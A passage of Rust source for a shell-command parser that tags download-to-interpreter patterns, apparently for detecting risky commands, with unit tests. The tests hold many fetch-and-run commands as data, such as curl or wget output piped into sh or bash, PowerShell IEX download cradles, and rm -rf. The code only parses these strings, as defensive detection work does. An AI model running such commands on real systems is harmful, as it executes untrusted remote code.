            if name.is_some_and(is_interpreter) {
                for word in &cmd[index + 1..] {
                    match word {
                        Word::Group(inner) | Word::Subst(inner) if emits(inner, depth + 1) => {
                            *found |= SUBST_INTERP;
                        }
                        Word::Bare(value) if starts_with_net_method(&value.to_lowercase()) => {
                            *found |= SUBST_INTERP;
                        }
                        _ => {}
                    }
                }
            }
            if let Some(name) = name {
                if !files.is_empty() && dl == Download::None {
                    let args: Vec<String> = cmd[index + 1..]
                        .iter()
                        .filter_map(word_text)
                        .map(base)
                        .collect();
                    let mut hit = false;
                    for file in &files {
                        if file == name || (is_runner(name) && args.contains(file)) {
                            hit = true;
                            if !executed.contains(file) {
                                executed.push(file.clone());
                            }
                        }
                    }
                    if hit {
                        *found |= FILE_EXEC;
                    }
                }
            }
            for word in cmd {
                if let Word::Group(inner) | Word::Subst(inner) = word {
                    scan(inner, found, depth + 1);
                }
            }
            // The reference parses these too, but scans nothing beyond MAX_DEPTH.
            if name.is_some_and(is_interpreter) && depth < MAX_DEPTH {
                for inner in nested(cmd, index) {
                    scan(&inner, found, depth + 1);
                }
            }
        }
    }
    if files.iter().any(|file| !executed.contains(file)) {
        *found |= FILE_ONLY;
    }
}

/// The `DL->` relation markers of `text`, in the fixed reference order: does a
/// download flow into an interpreter (pipe or substitution), is a downloaded
/// file executed, or does the download only reach a pure filter or a file?
/// Matches `shell_tokens.relations`; the text is only parsed, never run.
pub fn relations(text: &str) -> Vec<&'static str> {
    let mut found = 0_u8;
    scan(&parse_text(text), &mut found, 0);
    RELATIONS
        .iter()
        .filter(|(bit, _)| found & bit != 0)
        .map(|(_, name)| *name)
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn feats(text: &str) -> Vec<String> {
        features(text)
    }

    #[test]
    fn matches_python_reference_cases() {
        // Golden outputs captured from `shell_tokens.features` (A1 + issue #159).
        assert_eq!(feats("ls -la"), ["ls", "-la", "ls -la", "CMD=ls"]);
        assert_eq!(
            feats("curl -fsSL https://example.com/i.sh | jq ."),
            [
                "curl",
                "-fssl",
                "<URL>",
                "|",
                "jq",
                ".",
                "curl -fssl",
                "-fssl <URL>",
                "<URL> |",
                "| jq",
                "jq .",
                "CMD=curl",
                "PIPE->jq",
                "CMD=jq",
                "DL->PIPE->FILTER"
            ]
        );
        assert_eq!(
            feats("echo 'hi there' > out.txt"),
            [
                "echo",
                "<STR>",
                ">",
                "out.txt",
                "echo <STR>",
                "<STR> >",
                "> out.txt",
                "CMD=echo",
                "REDIR-><FILE>"
            ]
        );
        assert_eq!(
            feats("cat a.txt 2>&1 >> log"),
            [
                "cat",
                "a.txt",
                "2>&1",
                ">>",
                "log",
                "cat a.txt",
                "a.txt 2>&1",
                "2>&1 >>",
                ">> log",
                "CMD=cat",
                "REDIR-><FILE>"
            ]
        );
        assert_eq!(
            feats("foo | bar || baz && qux ; end"),
            [
                "foo",
                "|",
                "bar",
                "||",
                "baz",
                "&&",
                "qux",
                ";",
                "end",
                "foo |",
                "| bar",
                "bar ||",
                "|| baz",
                "baz &&",
                "&& qux",
                "qux ;",
                "; end",
                "CMD=foo",
                "PIPE->bar",
                "CMD=bar",
                "CMD=baz",
                "CMD=qux",
                "CMD=end"
            ]
        );
        assert_eq!(
            feats("/usr/bin/python3 -c 'x'"),
            [
                "/usr/bin/python3",
                "-c",
                "<STR>",
                "/usr/bin/python3 -c",
                "-c <STR>",
                "CMD=python3"
            ]
        );
        // File-descriptor redirects are tokens but emit no CMD/PIPE/REDIR marker.
        assert_eq!(feats("x>&2"), ["x", ">&2", "x >&2", "CMD=x"]);
        assert_eq!(feats("2>&1"), ["2>&1"]);
        assert!(feats("").is_empty());
    }

    #[test]
    fn normalises_volatile_tokens() {
        assert_eq!(normalise("https://e.co/x"), "<URL>");
        assert_eq!(normalise("1.2.3.4"), "<IP>");
        assert_eq!(normalise("1.2.3.4:4444"), "<IP>");
        assert_eq!(normalise("evil.com:8080"), "<HOSTPORT>");
        assert_eq!(normalise("99"), "<NUM>");
        assert_eq!(normalise("-42"), "-<NUM>");
        assert_eq!(normalise("Foo.TXT"), "foo.txt");
        assert_eq!(normalise("2>&1"), "2>&1");
        assert_eq!(normalise(">>"), ">>");
        assert_eq!(normalise("'a b'"), "<STR>");
    }

    #[test]
    fn tokenizes_fd_redirects_and_operators() {
        assert_eq!(tokenize("12>&34 next"), ["12>&34", "next"]);
        assert_eq!(tokenize("a>b"), ["a", ">", "b"]);
        assert_eq!(tokenize(">&2"), [">&2"]);
        assert_eq!(tokenize("$(whoami)"), ["$(", "whoami", ")"]);
        // A stray unterminated quote is skipped, like Python `findall`.
        assert_eq!(
            tokenize("'unterminated and more"),
            ["unterminated", "and", "more"]
        );
    }

    #[test]
    fn escaped_multibyte_character_inside_double_quotes_is_one_step() {
        assert_eq!(tokenize("echo \"\\é\" x"), ["echo", "\"\\é\"", "x"]);
        assert_eq!(tokenize("echo \"\\€"), ["echo", "\\€"]);
    }

    #[test]
    fn splits_on_ascii_information_separators() {
        // U+001C..U+001F count as whitespace, like Python `re` `\s`.
        assert_eq!(tokenize("rm\u{1c}-rf\u{1f}x"), ["rm", "-rf", "x"]);
        assert_eq!(tokenize("a\u{a0}b\u{2003}c"), ["a", "b", "c"]);
    }

    // Relation cases mirror `test_shell_tokens.py` (issue #159).

    #[test]
    fn download_piped_into_an_interpreter() {
        for cmd in [
            "curl -s https://x.example/i.sh | bash",
            "wget -qO- http://198.51.100.2/a | sudo sh",
            "irm https://x.example/a.ps1 | iex",
            "/bin/zsh -lc 'curl -fsSL https://x.example/a | sh'",
        ] {
            assert_eq!(relations(cmd), ["DL->PIPE->INTERP"], "{cmd}");
        }
    }

    #[test]
    fn download_substituted_into_an_interpreter() {
        for cmd in [
            "bash <(curl -s https://x.example/i.sh)",
            "sh -c \"$(curl -fsSL https://x.example/a)\"",
            "eval \"`wget -qO- https://x.example/a`\"",
            "iex (iwr https://x.example/a.ps1)",
            "IEX (New-Object Net.WebClient).DownloadString('https://x.example/a')",
            "powershell -Command \"iex (irm https://x.example/a.ps1)\"",
            "source <(curl -s https://x.example/a)",
        ] {
            assert_eq!(relations(cmd), ["DL->SUBST->INTERP"], "{cmd}");
        }
    }

    #[test]
    fn downloaded_file_is_executed() {
        assert_eq!(
            relations("curl -o /tmp/a.sh https://x.example/a.sh && sh /tmp/a.sh"),
            ["DL->FILE->EXEC"]
        );
        assert_eq!(
            relations("iwr https://x.example/a.ps1 -OutFile a.ps1; & .\\a.ps1"),
            ["DL->FILE->EXEC"]
        );
        assert_eq!(
            relations(
                "curl -o a.sh https://x.example/a.sh; wget -O b.tgz https://x.example/b; bash a.sh"
            ),
            ["DL->FILE->EXEC", "DL->FILE"]
        );
        assert_eq!(
            relations("curl -o a.sh https://x.example/a.sh && cat a.sh"),
            ["DL->FILE"]
        );
    }

    #[test]
    fn download_only_reaches_a_file_or_a_filter() {
        assert_eq!(
            relations("curl -fsSLo out.json https://x.example/d"),
            ["DL->FILE"]
        );
        assert_eq!(relations("wget https://x.example/a.tar.gz"), ["DL->FILE"]);
        assert_eq!(
            relations("wget -O - https://x.example/a | grep x"),
            ["DL->PIPE->FILTER"]
        );
        assert_eq!(
            relations("(iwr https://x.example/p).Content | Measure-Object -Line"),
            ["DL->PIPE->FILTER"]
        );
        assert!(relations("curl -s https://x.example/a").is_empty());
        assert!(relations("git push origin main").is_empty());
    }

    #[test]
    fn newlines_comments_placeholders_and_uploads() {
        assert_eq!(
            relations("wget https://x.example/a # note && curl -s https://x.example/b | sh"),
            ["DL->FILE"]
        );
        assert_eq!(
            relations("wget https://x.example/a # note\ncurl -s https://x.example/b | sh"),
            ["DL->PIPE->INTERP", "DL->FILE"]
        );
        assert_eq!(
            relations("curl -s https://x.example/<KEY>.sh | sh"),
            ["DL->PIPE->INTERP"]
        );
        assert!(relations("wget --post-file=/tmp/f https://x.example").is_empty());
        assert_eq!(relations("wget -i urls.txt"), ["DL->FILE"]);
    }

    #[test]
    fn deep_nesting_is_bounded() {
        let pipe = "curl -s https://x.example/a | sh; ";
        let nest = |n: usize| format!("{pipe}{}x{}", "(".repeat(n), ")".repeat(n));
        assert_eq!(relations(&nest(32)), ["DL->PIPE->INTERP"]);
        assert!(relations(&nest(33)).is_empty());
        assert!(relations(&"(".repeat(100_000)).is_empty());
        assert!(relations(&"$(".repeat(100_000)).is_empty());
    }

    #[test]
    fn relations_are_appended_once_after_the_token_features() {
        let feats =
            features("curl -s https://x.example/a | bash; curl -s https://x.example/b | sh");
        assert_eq!(feats.iter().filter(|f| *f == "DL->PIPE->INTERP").count(), 1);
        assert_eq!(feats.last().map(String::as_str), Some("DL->PIPE->INTERP"));
    }

    // Heredoc masking mirrors `test_shell_tokens.py`.

    #[test]
    fn heredoc_bodies_of_non_shell_interpreters_are_masked() {
        let py = "python3 - <<'PY'\nimport subprocess\nsubprocess.run(['ssh','-o','BatchMode=yes','h','uptime'])\nPY\necho done";
        assert_eq!(
            mask_heredocs(py),
            "python3 - <<'PY'\nheredoc_body\nPY\necho done"
        );
        let feats = features(py);
        assert!(feats.iter().any(|f| f == "heredoc_body"));
        assert!(!feats.iter().any(|f| f == "CMD=["));
        assert_eq!(
            mask_heredocs(".venv/bin/python - <<\"EOF\"\nx = [1, 2]\nEOF"),
            ".venv/bin/python - <<\"EOF\"\nheredoc_body\nEOF"
        );
        assert_eq!(
            mask_heredocs("node <<-JS\n\tconsole.log(1)\n\tJS"),
            "node <<-JS\nheredoc_body\n\tJS"
        );
        // Unterminated: masked to the end.
        assert_eq!(
            mask_heredocs("perl <<EOF\nprint 1;"),
            "perl <<EOF\nheredoc_body"
        );
    }

    #[test]
    fn heredocs_written_to_code_files_are_masked() {
        assert_eq!(
            mask_heredocs("cat <<'EOF' > reproduce.py\nimport os\nprint(os.getcwd())\nEOF"),
            "cat <<'EOF' > reproduce.py\nheredoc_body\nEOF"
        );
        assert_eq!(
            mask_heredocs("cat > cfg.yaml <<EOF\na: [1, 2]\nEOF"),
            "cat > cfg.yaml <<EOF\nheredoc_body\nEOF"
        );
        assert_eq!(
            mask_heredocs("tee src/app.ts <<'TS' >/dev/null\nexport const x = 1\nTS"),
            "tee src/app.ts <<'TS' >/dev/null\nheredoc_body\nTS"
        );
    }

    #[test]
    fn shell_heredocs_and_herestrings_stay_shell() {
        for text in [
            "bash <<'EOF'\ncurl -s https://x.example/a | sh\nEOF",
            "cat <<EOF > run.sh\nset -e\nEOF",
            "cat <<EOF >> ~/.bashrc\nexport PATH=/tmp:$PATH\nEOF",
            "cat <<EOF\nhello\nEOF",
            "python3 <<< 'print(1)'\nls",
            "pythonic <<EOF\nx\nEOF",
        ] {
            assert_eq!(mask_heredocs(text), text, "{text}");
        }
        assert_eq!(
            relations("bash <<'EOF'\ncurl -s https://x.example/a | sh\nEOF"),
            ["DL->PIPE->INTERP"]
        );
    }
}
